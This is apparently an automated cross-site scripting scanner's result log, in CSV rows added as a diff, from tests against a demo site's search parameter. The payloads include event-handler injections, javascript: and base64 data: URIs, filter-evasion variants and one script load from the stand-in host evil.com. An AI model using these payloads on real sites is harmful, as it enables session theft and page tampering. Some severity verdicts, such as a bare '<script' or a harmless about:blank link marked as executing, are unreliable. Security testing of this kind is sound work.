+2026-01-10 17:01:10.153,2026-01-10 17:01:10.233,0.080,https://demo-knsl.onrender.com/search,GET,q,<select><option oninput=alert(1)>X</option></select>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:10.153,2026-01-10 17:01:10.285,0.132,https://demo-knsl.onrender.com/search,GET,q,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.152,2026-01-10 17:01:10.297,0.145,https://demo-knsl.onrender.com/search,GET,q,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.191,2026-01-10 17:01:10.301,0.111,https://demo-knsl.onrender.com/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.190,2026-01-10 17:01:10.301,0.112,https://demo-knsl.onrender.com/search,GET,q,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.195,2026-01-10 17:01:10.301,0.107,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.397,2026-01-10 17:01:10.307,0.910,https://demo-knsl.onrender.com/search,GET,q,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:10.223,2026-01-10 17:01:10.342,0.120,https://demo-knsl.onrender.com/search,GET,q,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.233,2026-01-10 17:01:10.347,0.114,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.297,2026-01-10 17:01:10.486,0.189,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.301,2026-01-10 17:01:10.486,0.184,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.301,2026-01-10 17:01:10.489,0.188,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=print()>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.301,2026-01-10 17:01:10.489,0.188,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.307,2026-01-10 17:01:10.493,0.187,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.194,2026-01-10 17:01:10.496,0.302,https://demo-knsl.onrender.com/search,GET,q,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.342,2026-01-10 17:01:10.497,0.155,https://demo-knsl.onrender.com/search,GET,q,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.347,2026-01-10 17:01:10.507,0.161,https://demo-knsl.onrender.com/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.489,2026-01-10 17:01:10.607,0.117,https://demo-knsl.onrender.com/search,GET,q,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.486,2026-01-10 17:01:10.607,0.121,https://demo-knsl.onrender.com/search,GET,q,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.486,2026-01-10 17:01:10.632,0.146,https://demo-knsl.onrender.com/search,GET,q,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.489,2026-01-10 17:01:10.632,0.143,https://demo-knsl.onrender.com/search,GET,q,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.497,2026-01-10 17:01:10.646,0.149,https://demo-knsl.onrender.com/search,GET,q,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.496,2026-01-10 17:01:10.647,0.151,https://demo-knsl.onrender.com/search,GET,q,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.507,2026-01-10 17:01:10.650,0.142,https://demo-knsl.onrender.com/search,GET,q,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.904,2026-01-10 17:01:10.708,0.804,https://demo-knsl.onrender.com/search,GET,q,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:10.607,2026-01-10 17:01:10.729,0.122,https://demo-knsl.onrender.com/search,GET,q,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.607,2026-01-10 17:01:10.729,0.123,https://demo-knsl.onrender.com/search,GET,q,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.632,2026-01-10 17:01:10.737,0.105,https://demo-knsl.onrender.com/search,GET,q,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.646,2026-01-10 17:01:10.758,0.112,https://demo-knsl.onrender.com/search,GET,q,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.650,2026-01-10 17:01:10.758,0.109,https://demo-knsl.onrender.com/search,GET,q,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.647,2026-01-10 17:01:10.761,0.115,https://demo-knsl.onrender.com/search,GET,q,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.708,2026-01-10 17:01:10.823,0.115,https://demo-knsl.onrender.com/search,GET,q,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.737,2026-01-10 17:01:10.843,0.105,https://demo-knsl.onrender.com/search,GET,q,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.729,2026-01-10 17:01:10.843,0.113,https://demo-knsl.onrender.com/search,GET,q,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.729,2026-01-10 17:01:10.849,0.120,https://demo-knsl.onrender.com/search,GET,q,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.761,2026-01-10 17:01:10.874,0.113,https://demo-knsl.onrender.com/search,GET,q,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.758,2026-01-10 17:01:10.884,0.126,https://demo-knsl.onrender.com/search,GET,q,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.758,2026-01-10 17:01:10.885,0.127,https://demo-knsl.onrender.com/search,GET,q,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.823,2026-01-10 17:01:10.904,0.081,https://demo-knsl.onrender.com/search,GET,q,<table><caption onmouseover=alert(1)>X</caption></table>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:10.843,2026-01-10 17:01:10.966,0.124,https://demo-knsl.onrender.com/search,GET,q,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.843,2026-01-10 17:01:10.971,0.128,https://demo-knsl.onrender.com/search,GET,q,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.849,2026-01-10 17:01:10.981,0.132,https://demo-knsl.onrender.com/search,GET,q,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.874,2026-01-10 17:01:10.988,0.114,https://demo-knsl.onrender.com/search,GET,q,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.885,2026-01-10 17:01:10.989,0.105,https://demo-knsl.onrender.com/search,GET,q,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.285,2026-01-10 17:01:11.042,0.757,https://demo-knsl.onrender.com/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:10.884,2026-01-10 17:01:11.045,0.161,https://demo-knsl.onrender.com/search,GET,q,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.904,2026-01-10 17:01:11.045,0.142,https://demo-knsl.onrender.com/search,GET,q,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.971,2026-01-10 17:01:11.126,0.155,https://demo-knsl.onrender.com/search,GET,q,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.989,2026-01-10 17:01:11.142,0.152,https://demo-knsl.onrender.com/search,GET,q,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.981,2026-01-10 17:01:11.142,0.161,https://demo-knsl.onrender.com/search,GET,q,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.988,2026-01-10 17:01:11.145,0.157,https://demo-knsl.onrender.com/search,GET,q,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.042,2026-01-10 17:01:11.157,0.115,https://demo-knsl.onrender.com/search,GET,q,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.045,2026-01-10 17:01:11.158,0.113,https://demo-knsl.onrender.com/search,GET,q,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.045,2026-01-10 17:01:11.162,0.117,https://demo-knsl.onrender.com/search,GET,q,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.126,2026-01-10 17:01:11.244,0.118,https://demo-knsl.onrender.com/search,GET,q,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.145,2026-01-10 17:01:11.246,0.101,https://demo-knsl.onrender.com/search,GET,q,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.142,2026-01-10 17:01:11.258,0.116,https://demo-knsl.onrender.com/search,GET,q,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.142,2026-01-10 17:01:11.258,0.116,https://demo-knsl.onrender.com/search,GET,q,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.493,2026-01-10 17:01:11.262,0.769,https://demo-knsl.onrender.com/search,GET,q,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,No,,High
+2026-01-10 17:01:11.157,2026-01-10 17:01:11.300,0.143,https://demo-knsl.onrender.com/search,GET,q,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.158,2026-01-10 17:01:11.300,0.143,https://demo-knsl.onrender.com/search,GET,q,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.244,2026-01-10 17:01:11.362,0.117,https://demo-knsl.onrender.com/search,GET,q,<strong onmouseover=alert(1)>X</strong>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:10.632,2026-01-10 17:01:11.384,0.753,https://demo-knsl.onrender.com/search,GET,q,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:11.246,2026-01-10 17:01:11.390,0.144,https://demo-knsl.onrender.com/search,GET,q,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.258,2026-01-10 17:01:11.390,0.132,https://demo-knsl.onrender.com/search,GET,q,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.258,2026-01-10 17:01:11.394,0.137,https://demo-knsl.onrender.com/search,GET,q,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.300,2026-01-10 17:01:11.402,0.102,https://demo-knsl.onrender.com/search,GET,q,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.300,2026-01-10 17:01:11.406,0.106,https://demo-knsl.onrender.com/search,GET,q,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.362,2026-01-10 17:01:11.500,0.138,https://demo-knsl.onrender.com/search,GET,q,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.384,2026-01-10 17:01:11.508,0.124,https://demo-knsl.onrender.com/search,GET,q,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.390,2026-01-10 17:01:11.510,0.120,https://demo-knsl.onrender.com/search,GET,q,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.390,2026-01-10 17:01:11.513,0.122,https://demo-knsl.onrender.com/search,GET,q,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.394,2026-01-10 17:01:11.526,0.131,https://demo-knsl.onrender.com/search,GET,q,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.402,2026-01-10 17:01:11.547,0.145,https://demo-knsl.onrender.com/search,GET,q,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.406,2026-01-10 17:01:11.548,0.142,https://demo-knsl.onrender.com/search,GET,q,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.510,2026-01-10 17:01:11.570,0.060,https://demo-knsl.onrender.com/search,GET,q,<section onmouseover=alert(1)>X</section>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:11.500,2026-01-10 17:01:11.604,0.104,https://demo-knsl.onrender.com/search,GET,q,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.508,2026-01-10 17:01:11.623,0.114,https://demo-knsl.onrender.com/search,GET,q,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.547,2026-01-10 17:01:11.631,0.083,https://demo-knsl.onrender.com/search,GET,q,<figcaption onmouseover=alert(1)>X</figcaption>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:11.513,2026-01-10 17:01:11.634,0.121,https://demo-knsl.onrender.com/search,GET,q,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.526,2026-01-10 17:01:11.635,0.109,https://demo-knsl.onrender.com/search,GET,q,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.548,2026-01-10 17:01:11.685,0.137,https://demo-knsl.onrender.com/search,GET,q,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.966,2026-01-10 17:01:11.765,0.799,https://demo-knsl.onrender.com/search,GET,q,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:11.634,2026-01-10 17:01:11.774,0.140,https://demo-knsl.onrender.com/search,GET,q,<button onclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:11.635,2026-01-10 17:01:11.774,0.140,https://demo-knsl.onrender.com/search,GET,q,<button ondblclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:11.570,2026-01-10 17:01:11.776,0.206,https://demo-knsl.onrender.com/search,GET,q,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.604,2026-01-10 17:01:11.777,0.173,https://demo-knsl.onrender.com/search,GET,q,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.685,2026-01-10 17:01:11.783,0.097,https://demo-knsl.onrender.com/search,GET,q,<button onmousedown=alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:11.631,2026-01-10 17:01:11.800,0.170,https://demo-knsl.onrender.com/search,GET,q,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.765,2026-01-10 17:01:11.852,0.087,https://demo-knsl.onrender.com/search,GET,q,<button onmouseup=alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:11.774,2026-01-10 17:01:11.891,0.116,https://demo-knsl.onrender.com/search,GET,q,'><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.774,2026-01-10 17:01:11.891,0.117,https://demo-knsl.onrender.com/search,GET,q,"""><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.777,2026-01-10 17:01:11.895,0.117,https://demo-knsl.onrender.com/search,GET,q,';alert(1);//,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.776,2026-01-10 17:01:11.895,0.118,https://demo-knsl.onrender.com/search,GET,q,"""></script><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.783,2026-01-10 17:01:11.900,0.117,https://demo-knsl.onrender.com/search,GET,q,""";alert(1);//",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.800,2026-01-10 17:01:11.913,0.113,https://demo-knsl.onrender.com/search,GET,q,""" onmouseover=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.162,2026-01-10 17:01:11.925,0.763,https://demo-knsl.onrender.com/search,GET,q,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:11.852,2026-01-10 17:01:11.967,0.115,https://demo-knsl.onrender.com/search,GET,q,"""onmouseover=""alert(1)",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.891,2026-01-10 17:01:11.992,0.101,https://demo-knsl.onrender.com/search,GET,q,' onmouseover=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.900,2026-01-10 17:01:12.002,0.102,https://demo-knsl.onrender.com/search,GET,q,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.895,2026-01-10 17:01:12.010,0.116,https://demo-knsl.onrender.com/search,GET,q,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.895,2026-01-10 17:01:12.010,0.116,https://demo-knsl.onrender.com/search,GET,q,</script><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.913,2026-01-10 17:01:12.017,0.104,https://demo-knsl.onrender.com/search,GET,q,</script><svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.262,2026-01-10 17:01:12.045,0.782,https://demo-knsl.onrender.com/search,GET,q,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:11.925,2026-01-10 17:01:12.051,0.126,https://demo-knsl.onrender.com/search,GET,q,--><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.967,2026-01-10 17:01:12.085,0.118,https://demo-knsl.onrender.com/search,GET,q,--!><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.002,2026-01-10 17:01:12.106,0.104,https://demo-knsl.onrender.com/search,GET,q,<q/onclick=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.010,2026-01-10 17:01:12.113,0.103,https://demo-knsl.onrender.com/search,GET,q,<q/onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.010,2026-01-10 17:01:12.115,0.105,https://demo-knsl.onrender.com/search,GET,q,<q/ondrag=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.891,2026-01-10 17:01:12.120,0.229,https://demo-knsl.onrender.com/search,GET,q,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.017,2026-01-10 17:01:12.145,0.128,https://demo-knsl.onrender.com/search,GET,q,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.045,2026-01-10 17:01:12.149,0.105,https://demo-knsl.onrender.com/search,GET,q,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.051,2026-01-10 17:01:12.180,0.128,https://demo-knsl.onrender.com/search,GET,q,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.120,2026-01-10 17:01:12.188,0.068,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1) onerror=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:12.085,2026-01-10 17:01:12.207,0.122,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.106,2026-01-10 17:01:12.223,0.117,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.115,2026-01-10 17:01:12.223,0.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.113,2026-01-10 17:01:12.223,0.111,https://demo-knsl.onrender.com/search,GET,q,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.149,2026-01-10 17:01:12.267,0.117,https://demo-knsl.onrender.com/search,GET,q,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.145,2026-01-10 17:01:12.306,0.161,https://demo-knsl.onrender.com/search,GET,q,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.188,2026-01-10 17:01:12.328,0.139,https://demo-knsl.onrender.com/search,GET,q,<video poster=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.180,2026-01-10 17:01:12.330,0.151,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.207,2026-01-10 17:01:12.330,0.124,https://demo-knsl.onrender.com/search,GET,q,<html manifest=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.223,2026-01-10 17:01:12.333,0.110,https://demo-knsl.onrender.com/search,GET,q,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.223,2026-01-10 17:01:12.337,0.114,https://demo-knsl.onrender.com/search,GET,q,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.223,2026-01-10 17:01:12.346,0.123,https://demo-knsl.onrender.com/search,GET,q,<img dynsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.267,2026-01-10 17:01:12.412,0.145,https://demo-knsl.onrender.com/search,GET,q,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.623,2026-01-10 17:01:12.413,0.791,https://demo-knsl.onrender.com/search,GET,q,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:12.306,2026-01-10 17:01:12.418,0.112,https://demo-knsl.onrender.com/search,GET,q,<a href=about:blank>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.333,2026-01-10 17:01:12.456,0.123,https://demo-knsl.onrender.com/search,GET,q,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.330,2026-01-10 17:01:12.459,0.129,https://demo-knsl.onrender.com/search,GET,q,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.330,2026-01-10 17:01:12.465,0.134,https://demo-knsl.onrender.com/search,GET,q,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.346,2026-01-10 17:01:12.466,0.120,https://demo-knsl.onrender.com/search,GET,q,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.337,2026-01-10 17:01:12.467,0.130,https://demo-knsl.onrender.com/search,GET,q,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.418,2026-01-10 17:01:12.544,0.125,https://demo-knsl.onrender.com/search,GET,q,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.412,2026-01-10 17:01:12.544,0.132,https://demo-knsl.onrender.com/search,GET,q,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.413,2026-01-10 17:01:12.554,0.141,https://demo-knsl.onrender.com/search,GET,q,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.456,2026-01-10 17:01:12.566,0.109,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.459,2026-01-10 17:01:12.572,0.113,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.467,2026-01-10 17:01:12.580,0.113,https://demo-knsl.onrender.com/search,GET,q,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.465,2026-01-10 17:01:12.616,0.152,https://demo-knsl.onrender.com/search,GET,q,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.466,2026-01-10 17:01:12.618,0.153,https://demo-knsl.onrender.com/search,GET,q,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.566,2026-01-10 17:01:12.669,0.103,https://demo-knsl.onrender.com/search,GET,q,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.554,2026-01-10 17:01:12.670,0.117,https://demo-knsl.onrender.com/search,GET,q,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.544,2026-01-10 17:01:12.670,0.127,https://demo-knsl.onrender.com/search,GET,q,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.572,2026-01-10 17:01:12.679,0.107,https://demo-knsl.onrender.com/search,GET,q,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.544,2026-01-10 17:01:12.690,0.146,https://demo-knsl.onrender.com/search,GET,q,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.580,2026-01-10 17:01:12.695,0.116,https://demo-knsl.onrender.com/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.618,2026-01-10 17:01:12.731,0.113,https://demo-knsl.onrender.com/search,GET,q,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:12.616,2026-01-10 17:01:12.731,0.115,https://demo-knsl.onrender.com/search,GET,q,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:11.992,2026-01-10 17:01:12.736,0.744,https://demo-knsl.onrender.com/search,GET,q,<q/oncut=prompt(1)>,RAW_REFLECTION,No,,High
